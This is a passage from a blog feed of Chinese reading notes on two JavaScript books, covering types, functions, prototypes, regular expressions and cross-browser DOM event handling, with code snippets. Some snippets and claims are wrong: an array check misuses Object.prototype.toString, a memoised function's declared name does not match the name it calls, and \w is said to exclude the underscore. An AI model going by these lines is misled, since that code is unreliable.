<li>IE9 及以上浏览器支持 <code>&lt;canvas&gt;</code></li>
</ul>
<h3 id="HTML5-API"><a href="#HTML5-API" class="headerlink" title="HTML5 API"></a>HTML5 API</h3><ul>
<li>地理位置 API 通常会弹窗提示用户授权使用位置信息</li>
<li>利用 <code>location.hash</code> 和对应的 <code>hashchange</code> 事件可以实现IE8中的单页应用历史管理</li>
<li>利用GTML5新增的 <code>history.pushState</code>、<code>history.replaceState</code> 及对应事件，可灵活管理 SPA 的历史状态</li>
<li>IE8 支持 <code>window.postMessage()</code> 方法进行窗口间信息传递</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;继续阅读，这里是客户端JavaScript实现的部分&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/JavaScript权威指南.jpg&quot; alt=&quot;JavaScript权威指南&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《JavaScript权威指南》阅读笔记（上）</title>
    <link href="https://github.com/Hyifu/2016/03/13/%E3%80%8AJavaScript%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://github.com/Hyifu/2016/03/13/《JavaScript权威指南》阅读笔记（上）/</id>
    <published>2016-03-12T16:00:00.000Z</published>
    <updated>2017-04-21T09:25:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>断续读完了 JavaScript 开发者眼中的圣经，总之，真是厚厚的一本手册，上千页的非常详细的介绍，大部分是基于 API 的细节，因此很多东西其实是没必要做笔记的（没必要的意思是，随着阅历的增加，很多特性你也许已经了然于胸，但不管怎样，圣经就是圣经，我觉得有空多看两遍核心部分是很有裨益的），因此这里只列出一些核心点和容易被疏漏的地方，首先是第一部分，关于语言的核心</p>
<p><img src="/images/JavaScript权威指南.jpg" alt="JavaScript权威指南"></p>
<a id="more"></a>
<blockquote>
<p>作者 <strong>David Flanagan</strong>，封面动物：爪哇犀牛 - Javan rhinoceros</p>
</blockquote>
<h2 id="词法结构"><a href="#词法结构" class="headerlink" title="词法结构"></a>词法结构</h2><ul>
<li><strong>JavaScript</strong> 使用 <code>unicode</code> 编码</li>
<li>分号解析规则：缺少分号无法解析代码的时候（因此以 <code>(</code> 或 <code>[</code> 开始的代码很大可能与前面的语句一起解析）</li>
</ul>
<h2 id="类型、值和变量"><a href="#类型、值和变量" class="headerlink" title="类型、值和变量"></a>类型、值和变量</h2><ul>
<li>两种数据类型<ul>
<li>基本类型（Primitive），也是不可变类型<ul>
<li>Number</li>
<li>String</li>
<li>Boolean</li>
<li>Null</li>
<li>Undefined       </li>
<li>Symbol</li>
</ul>
</li>
<li>对象（Object），也是可变类型<ul>
<li>数组 Array</li>
<li>函数 Function</li>
<li>其他（包括 Date、RegExp 等）</li>
</ul>
</li>
</ul>
</li>
<li><p>字符串换行技巧</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 通用</span></div><div class="line"><span class="keyword">var</span> str1 = <span class="string">''</span>+</div><div class="line">    <span class="string">'line1'</span>+</div><div class="line">    <span class="string">'line2'</span></div><div class="line"></div><div class="line"><span class="comment">// ES5</span></div><div class="line"><span class="keyword">var</span> str2 = <span class="string">'\</span></div><div class="line">    line1\</div><div class="line">    line2'</div><div class="line"></div><div class="line"><span class="comment">// ES6</span></div><div class="line"><span class="keyword">var</span> str3 = <span class="string">`</span></div><div class="line">    line1</div><div class="line">    line2</div><div class="line">`</div></pre></td></tr></table></figure>
</li>
<li><p>转换为 <code>false</code> 的六个值，其他均为 <code>true</code></p>
<ul>
<li>undefined</li>
<li>null</li>
<li>0</li>
<li>-0</li>
<li>NaN</li>
<li>“”（空字符串）</li>
</ul>
</li>
<li><code>null</code> 与 <code>undefined</code><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typeof</span> <span class="literal">null</span> === <span class="string">'object'</span> <span class="comment">// true, 表明是一个空对象</span></div><div class="line"><span class="comment">// 而 undefined 则指代一种更深层次的空 =&gt; 未定义或不存在</span></div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="表达式和运算符"><a href="#表达式和运算符" class="headerlink" title="表达式和运算符"></a>表达式和运算符</h2><ul>
<li><p>前后自增量</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> i = <span class="number">1</span>, j = ++i <span class="comment">// i和j的值都是2，前增量 pre-increment，赋值前自增</span></div><div class="line"><span class="keyword">var</span> i = <span class="number">1</span>, j = i++ <span class="comment">// i是2，j是1，后增量 post-increment</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>NaN</code> 与任何值不相等，包括本身</p>
</li>
<li><p><code>in</code> 操作符用来检测对象的属性是否存在</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> data = [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</div><div class="line"><span class="string">'0'</span> <span class="keyword">in</span> data === <span class="literal">true</span> <span class="comment">// true 因为存在索引0，可以转换成字符串 '0'</span></div></pre></td></tr></table></figure>
</li>
<li><p>通过 <code>delete</code> 操作符删除数组元素并不会修改数组长度</p>
</li>
</ul>
<h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><ul>
<li>函数或声明不应该放在除函数外的代码块中</li>
<li>在函数中，<code>switch</code> 中的 <code>break</code> 可以用 <code>return</code> 实现</li>
<li><code>break</code> 不同通过标签跳转到函数外部</li>
<li><code>catch</code> 语句中花括号是有块级作用域的</li>
</ul>
<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> obj1 = &#123;</div><div class="line">  <span class="string">'current age'</span>: <span class="number">26</span>, <span class="comment">// 空格或连字符做属性要加引号</span></div><div class="line">  <span class="string">'for'</span>: <span class="string">'wife'</span>, <span class="comment">// 保留字，ES3 中必须加引号，建议一致加引号</span></div><div class="line">  name: <span class="string">'james'</span>, <span class="comment">// ES3 中此逗号在 IE 中会报错，建议去除</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">var</span> obj2 = <span class="built_in">Object</span>.create(<span class="literal">null</span>) <span class="comment">// 不会继承任何属性和方法</span></div><div class="line"><span class="keyword">var</span> obj3 = <span class="built_in">Object</span>.create(<span class="built_in">Object</span>.prototype) <span class="comment">// 相当于 var obj3 = &#123;&#125;</span></div></pre></td></tr></table></figure>
<ul>
<li>每一个对象都具有原型（<code>null</code> 与 <code>Object.prototype</code> 除外）</li>
</ul>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
<li><p>稀疏数组，数组的长度大于数组项的数量</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 产生稀疏数组</span></div><div class="line"><span class="keyword">var</span> a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">5</span>);</div><div class="line"><span class="keyword">var</span> a2 = []</div><div class="line">a2.length = <span class="number">5</span></div><div class="line"><span class="keyword">var</span> a3 = [, , ,]</div><div class="line"><span class="keyword">var</span> a4 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="keyword">delete</span> a4[<span class="number">1</span>] <span class="comment">// 等同于[1, , 3, 4]</span></div></pre></td></tr></table></figure>
</li>
<li><p>压缩数组</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="literal">undefined</span>, , , <span class="number">3</span>, <span class="literal">null</span>]</div><div class="line"><span class="comment">// b === [1, undefined, 3, null], 稀疏数组被压缩</span></div><div class="line">b = a.filter(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="literal">true</span></div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="comment">// c === [1,3],  进一步压缩 undefined 和 null</span></div><div class="line">c = a.filter(<span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> x !== <span class="literal">undefined</span> &amp;&amp; x !== <span class="literal">null</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure>
</li>
<li><p>空数组调用 <code>.every()</code> / <code>.some()</code> 总是返回 <code>true</code> / <code>false</code></p>
</li>
<li><p>如何判断一个未知对象是否为数组（只有两种方法）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>()</div><div class="line"><span class="built_in">Array</span>.isArray(arr) <span class="comment">//true, ES5+</span></div><div class="line"><span class="built_in">Object</span>.prototype.toString(arr) === <span class="string">'[object Array]'</span> <span class="comment">// ES3</span></div></pre></td></tr></table></figure>
</li>
<li><p>字符串可看成是只读的类数组对象，方便进行各种操作</p>
</li>
</ul>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul>
<li>不要将函数声明在代码块中（可换成表达式）</li>
<li><p>非严格模式中，直接调用函数时其内部的 <code>this</code> 指向全局对象，作为对象的方法调用时则指向方法所属对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 判断函数是否在严格模式中运行</span></div><div class="line"><span class="keyword">var</span> strict = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> !<span class="keyword">this</span> &#125;())</div></pre></td></tr></table></figure>
</li>
<li><p>方法的链式调用——当方法不需要返回值时，直接返回 <code>this</code></p>
</li>
<li><code>callee</code> 指向当前正在执行的函数，而 <code>caller</code> 则指向调用当前函数的函数（严格模式中禁用）</li>
<li><p>函数是一种特殊的对象，可以拥有属性（类似构造函数）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 如下例子，直接使用函数的属性存储外部初始值（每次调用函数都是0）， 而省去一次变量声明来存储初始值</span></div><div class="line">uniqueInterger.counter = <span class="number">0</span> <span class="comment">// 函数声明提前</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueInterger</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> uniqueInterger.counter++</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 函数同样可以把自己当成一个数组来使用，如下例子</span></div><div class="line"><span class="comment">// 计算阶乘，并将结果缓存到函数的属性中</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">factirual</span> (<span class="params">n</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!(n <span class="keyword">in</span> factorial)) &#123; <span class="comment">// 如果没有缓存结果</span></div><div class="line">    factorial[n] = n * factorial(n<span class="number">-1</span>) <span class="comment">// 计算结果并缓存</span></div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> factorial[n] <span class="comment">// 返回缓存的结果</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>技术角度上讲，所有的函数都是闭包。一般认为闭包是在函数中返回的另一个函数</p>
</li>
<li>函数的 <code>length</code> 为期待的形参个数，而 <code>argument.length</code> 则为实际传入实参个数</li>
<li><code>call()</code> 和 <code>apply()</code> 方法类似，第一个参数会绑定为 <code>this</code> 的值，apply参数传入放在一个数组中；而 <code>bind()</code> 是ES5+方法，绑定所有实参到对象<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// f.call(o) 或 f.apply(o) 的实际调用类似下面</span></div><div class="line">o.m = f; <span class="comment">// 将f存储为o的临时方法</span></div><div class="line">o.m(); <span class="comment">// 调用临时方法</span></div><div class="line"><span class="keyword">delete</span> o.m; <span class="comment">// 将临时方法删除</span></div><div class="line"></div><div class="line"><span class="comment">// 以对象o的方法调用函数f(), 并传入两个参数</span></div><div class="line">f.call(o, <span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 直接传入</span></div><div class="line">f.apply(o, [<span class="number">1</span>, <span class="number">2</span>]); <span class="comment">// 参数包装成数组形式，方便传入任意数量参数</span></div><div class="line"><span class="comment">// bind 对比 call 和 apply，不仅将第一个实参绑定至 this，也将其他实参绑定至引用对象（柯里化）</span></div></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 在ES3中实现 array.map() 方法，该实现为懒加载，因此只在初始化生成，避免每次调用 map 都要判断</span></div><div class="line"><span class="keyword">var</span> map = <span class="built_in">Array</span>.prototype.map</div><div class="line">  ? <span class="function"><span class="keyword">function</span> (<span class="params">array, func</span>) </span>&#123; <span class="keyword">return</span> array.map(func) &#125;</div><div class="line">  : <span class="function"><span class="keyword">function</span> (<span class="params">array, func</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> results = []</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = array.length; i &lt; len; i++) &#123;</div><div class="line">      <span class="keyword">if</span> (i <span class="keyword">in</span> array) &#123;</div><div class="line">        <span class="comment">// array.map(item, index. array)</span></div><div class="line">        results[i] = func.call(<span class="literal">null</span>, array[i], i, array)</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> results</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<ul>
<li>函数的 <code>toString()</code> 方法返回定义该函数的源码</li>
<li>一般不用 <code>Function()</code> 构造函数生成函数</li>
<li>高阶函数即操作函数的函数，接收函数作为参数</li>
</ul>
<h2 id="类和模块"><a href="#类和模块" class="headerlink" title="类和模块"></a>类和模块</h2><blockquote>
<p>类的所有实例对象都从同一个原型对象上继承属性，原型对象是类的核心</p>
</blockquote>
<ul>
<li>构造函数调用的一个重要特征是，构造函数的原型会被用作新对象的原型</li>
<li>构造函数是类的公共标识，原型对象是类的唯一标识</li>
<li><p><code>constructor</code> 属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span> (<span class="params"></span>) </span>&#123;&#125;</div><div class="line">F.prototype.constructor === F <span class="comment">// true</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> F()</div><div class="line">o.constructor === F <span class="comment">// true，一般类的实例的 constructor 指向类的构造函数</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">G</span> (<span class="params"></span>) </span>&#123;&#125;</div><div class="line">G.prototype = &#123;&#125; <span class="comment">// 直接赋值原型会导致 constructor 丢失</span></div><div class="line">G.prototype.constructor === G <span class="comment">// false</span></div><div class="line">G.prototype = &#123;</div><div class="line">  <span class="string">'constructor'</span>: G <span class="comment">// 显式设置构造函数反式引用修复上面问题</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p><code>instanceof</code> 检测的实际是对象的继承关系，而不是创建对象的构造函数</p>
</li>
<li><code>iframe</code> 中一个 <code>Array</code> 的实例不是另一个 <code>iframe</code> 中的 <code>Array</code> 的实例</li>
<li>一般通过闭包的方式实现私有状态</li>
<li>抽象类是指一种在最高祖先级别定义这个类应该具有的方法，但这些方法没有具体实现，如果在子孙类中没有通过重载复写，一般在调用时会触发祖先定义的方法提示</li>
<li>ES3 中，对象的读写等属性并不能自行配置，因此不能将自定义类模拟成内置对象（<code>for...in</code> 会遍历到）</li>
</ul>
<blockquote>
<p>犀牛书对于继承这一方面的介绍一开始就非常的深奥难懂，其实不是特别良好的教程，推荐阅读《JavaScript 高级程序设计》中关于原型与继承的部分</p>
</blockquote>
<h2 id="正则表达式的模式匹配"><a href="#正则表达式的模式匹配" class="headerlink" title="正则表达式的模式匹配"></a>正则表达式的模式匹配</h2><blockquote>
<p>JavaScript 的正则是 Perl 的大型子集</p>
</blockquote>
<ul>
<li>ES3 中，对于同样的正则表达式直接量，对应的是同一个正则对象。在 ES5 中，则跟对象等引用类似，不会因为同样是空对象就认为是同一个对象。（由于即使是 IE 的实现也符合 ES5 标准，因此实际上只需要考虑 ES5 的规定即可）</li>
<li>对于特殊的字符，需要用反斜杠进行转义</li>
<li>常见字符匹配语法<ul>
<li><code>[abc]</code> =&gt; 方括号内任意字符（这里是 a，b，c）</li>
<li><code>[^abc]</code> =&gt; 除方括号的任意字符（这里指不含 a 或 b 或c的任意一个）</li>
<li><code>.</code> =&gt; 除了换行符外的其他字符</li>
<li><code>\w</code> =&gt; 等价于 <code>[a-zA-Z0-9]</code>，指字母和数字</li>
<li><code>\W</code> =&gt; 上一条的取反</li>
<li><code>\s</code> =&gt; 一般匹配空格</li>
<li><code>\S</code> =&gt; 上一条的取反，一般指所有非空字符，范围比 <code>\w</code> 大一些</li>
<li><code>\d</code> =&gt; 等价于 <code>[0-9]</code>，匹配数字</li>
<li><code>\D</code> =&gt; 上一条取反，匹配非数字</li>
</ul>
</li>
<li>重复语法<ul>
<li><code>{n, m}</code> =&gt; 至少出现 <code>n</code> 次，但最多 <code>m</code> 次</li>
<li><code>{n,}</code> =&gt; 至少出现 <code>n</code> 次</li>
<li><code>{n}</code> =&gt; 只能出现 <code>n</code> 次</li>
<li><code>?</code> =&gt; 出现1次或不出现，等价于 <code>{0, 1}</code></li>
<li><code>+</code> =&gt; 至少出现1次，等价于 <code>{1,}</code></li>
<li><code>*</code> =&gt; 可以随便出现（不出现，1次或多次），等价于 <code>{0, }</code></li>
</ul>
</li>
<li>选择分组<ul>
<li><code>|</code> 选择符号，区分可选的分组，这些分组会短路判断，只有在前面的分组不匹配时才尝试后面的分组</li>
<li><code>()</code> 分组符号，将模式打包，定义子模式或子表达式（同时后面可以使用快捷写法）</li>
</ul>
</li>
<li>指定位置<ul>
<li><code>^</code> =&gt; 指定作为开头</li>
<li><code>$</code> =&gt; 指定作为结尾</li>
<li><code>\b</code> =&gt; 匹配边界</li>
<li><code>\B</code> =&gt; 上一条的取反</li>
</ul>
</li>
<li>修饰符<ul>
<li><code>i</code> =&gt; 忽略大小写</li>
<li><code>g</code> =&gt; 全局匹配</li>
<li><code>m</code> =&gt; 多行模式</li>
</ul>
</li>
<li>String 方法<ul>
<li><code>.search()</code> =&gt; 返回匹配字符串所在的位置，若无匹配则返回 <code>-1</code></li>
<li><code>.replace(reg, string)</code> =&gt; 执行检索和替换，参数可以是函数</li>
<li><code>.match()</code> =&gt; 全局检索时返回匹配结果的数组，否则返回首次匹配到的带自模式的</li>
<li><code>.split()</code> =&gt; 根据匹配项分割字符串</li>
</ul>
</li>
<li>一般推荐使用直接量法构造正则</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;断续读完了 JavaScript 开发者眼中的圣经，总之，真是厚厚的一本手册，上千页的非常详细的介绍，大部分是基于 API 的细节，因此很多东西其实是没必要做笔记的（没必要的意思是，随着阅历的增加，很多特性你也许已经了然于胸，但不管怎样，圣经就是圣经，我觉得有空多看两遍核心部分是很有裨益的），因此这里只列出一些核心点和容易被疏漏的地方，首先是第一部分，关于语言的核心&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/JavaScript权威指南.jpg&quot; alt=&quot;JavaScript权威指南&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《JavaScript高级程序设计》阅读笔记（下）</title>
    <link href="https://github.com/Hyifu/2015/12/27/%E3%80%8AJavaScript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>https://github.com/Hyifu/2015/12/27/《JavaScript高级程序设计》阅读笔记（下）/</id>
    <published>2015-12-26T16:00:00.000Z</published>
    <updated>2017-04-21T16:37:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>下半部分，主要涉及浏览器端，还有最佳实践和高级用法，尤其是高级技巧这一章，讲解了很多实战中会用到的有用技巧，让我来拓展一下吧。</p>
<p><img src="/images/JavaScript高级程序设计.jpg" alt="JavaScript高级程序设计"></p>
<a id="more"></a>
<blockquote>
<p>作者 <strong>Nicholas C. Zakas</strong></p>
</blockquote>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><ul>
<li>事件冒泡：最后冒泡到 <strong>window</strong> 对象</li>
<li><strong>DOM</strong> 事件流的三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段</li>
<li><strong>HTML</strong> 事件处理程序在运行时有权利访问所有全局作用域的所有代码（一般 <strong>HTML</strong> 事件被封装在 <code>try-catch</code> 块中以避免页面解析前触发事件程序）</li>
</ul>
<h4 id="DOM2级事件处理程序"><a href="#DOM2级事件处理程序" class="headerlink" title="DOM2级事件处理程序"></a>DOM2级事件处理程序</h4><ul>
<li><code>addEventListener()</code> 和 <code>removeEventListener()</code>，第三个参数布尔值指定事件是在冒泡阶段触发（false）还是捕获阶段触发（true）</li>
<li>使用 <code>attachEvent()</code> 方法的情况下，事件处理程序会在全局作用域中运行，因此 <code>this</code> 指向 window</li>
<li>event 对象中，<code>this</code> 与 <code>event.currentTarget</code> 相同，均指向事件注册的元素，而 <code>event.target</code> 则指向实际事件的触发元素，在 IE8 中，前者指向 window</li>
<li><code>preventDefault()</code> 阻止默认事件，在 IE 中则是 <code>window.event.returnValue = false</code></li>
<li><code>stopPropagation()</code> 阻止事件冒泡，在 IE 中则是 <code>window.event.cancelBubble = true</code></li>
<li>跨浏览器的事件处理程序<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> EventUtil = &#123;</div><div class="line">  <span class="attr">addHandler</span>: <span class="function"><span class="keyword">function</span> (<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (element.addEventListener) &#123;</div><div class="line">      element.addEventListener(type, handler, <span class="literal">false</span>)</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</div><div class="line">      element.attachEvent(<span class="string">'on'</span> + type, handler)</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      element[<span class="string">'on'</span> + type] = handler</div><div class="line">    &#125;</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">getEvent</span>: <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> event ? event : <span class="built_in">window</span>.event</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">getTarget</span>: <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> event.target || event.srcElement</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">preventDefault</span>: <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (event.preventDefault) &#123;</div><div class="line">      event.preventDefault()</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      event.returnValue = <span class="literal">false</span></div><div class="line">    &#125;</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">stopPropagation</span>: <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (event.stopPropagation) &#123;</div><div class="line">      event.stopPropagation()</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      event.cancelBubble = <span class="literal">true</span></div><div class="line">    &#125;</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">removeHandler</span>: <span class="function"><span class="keyword">function</span> (<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (element.removeEventListener) &#123;</div><div class="line">      element.removeEventListener(type, handler, <span class="literal">false</span>)</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.detachEvent) &#123;</div><div class="line">      element.detachEvent(<span class="string">'on'</span> + type, handler)</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      element[<span class="string">'on'</span> + type] = <span class="literal">null</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//使用</span></div><div class="line">EventUtil.addHandler(btn, <span class="string">'click'</span>, handler)</div><div class="line">EventUtil.removeHandler(btn, <span class="string">'click'</span>, handler)</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="鼠标与键盘事件"><a href="#鼠标与键盘事件" class="headerlink" title="鼠标与键盘事件"></a>鼠标与键盘事件</h4><ul>
<li>特殊事件<ul>
<li><code>blur</code> 与 <code>focus</code> 事件不会冒泡，因此可用 <code>focusin</code> 与 <code>focusout</code> 模拟替代</li>
<li><code>click</code> 由鼠标单击或按下回车键触发，而 <code>mousedown</code> 与 <code>mouseup</code> 则不支持键盘触发</li>
<li>鼠标事件中，<code>mouseenter</code> 与 <code>mouseout</code> 不会冒泡</li>
<li><code>mousewheel</code> 事件会冒泡到 window ，通过检测 <code>event.wheelDelta</code> 的正负号可判断滚动方向</li>
<li>触摸设备不支持 <code>dbclick</code>，此外还会有点击的 <strong>300ms</strong> 延迟</li>
</ul>
</li>
<li>坐标<ul>
<li><code>clientX</code> 和 <code>clientY</code> 保存鼠标相对 <strong>ViewPort</strong> 的位置，<code>pageX</code> 和 <code>pageY</code> （IE8不支持）则相对 <code>document</code> 页面位置（跨浏览器方案如下），<code>screenX</code> 和 <code>screenY</code> 则保存着相对于屏幕的位置<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>)</div><div class="line">EventUtil.addHandler(div, <span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">  event = EventUtil.getEvent(event)</div><div class="line">  <span class="keyword">var</span> pageX = event.pageX,</div><div class="line">  pageY = event.pageY</div><div class="line">  <span class="keyword">if</span> (pageX === <span class="literal">undefined</span>) &#123;</div><div class="line">    pageX = event.clientX + (<span class="built_in">document</span>.body.scrollLeft || <span class="built_in">document</span>.documentElement.scrollLeft) <span class="comment">//IE8</span></div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (pageY === <span class="literal">undefined</span>) &#123;</div><div class="line">    pageY = event.clientY + (<span class="built_in">document</span>.body.scrollTop || <span class="built_in">document</span>.documentElement.scrollTop) <span class="comment">//IE8</span></div><div class="line">  &#125;</div><div class="line">  alert(<span 